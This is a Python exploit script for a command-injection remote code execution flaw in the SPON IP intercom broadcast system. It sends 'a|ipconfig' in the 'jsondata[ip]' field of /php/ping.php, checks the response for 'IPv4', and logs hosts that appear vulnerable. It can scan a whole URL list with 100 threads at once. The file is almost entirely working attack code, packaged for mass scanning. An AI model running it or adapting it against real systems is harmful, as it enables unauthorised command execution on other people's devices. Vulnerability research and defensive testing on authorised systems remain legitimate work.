# SPON IP网络对讲广播系统RCE
import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            author:q
                            version:0.0.2
'''
    print(banner)
def poc(target):
    url = target+'/php/ping.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'jsondata[ip]':'a|ipconfig','jsondata[type]':'1'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        if 'IPv4' in res.text:
            print("[+]"+ target + "存在SPON IP网络对讲广播系统RCE")
            with open('seccess.txt','a',encoding='utf-8') as f:
                f.write('[+]'+target+'存在SPON IP网络对讲广播系统RCE\n')
        else:
            print("[-]"+ target + "不存在漏洞")

    except:
        print('发生错误')

def main():
    banner()
    parser = argparse.ArgumentParser(description='SPON IP网络对讲广播系统RCE')
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



if __name__ == '__main__':
    main()
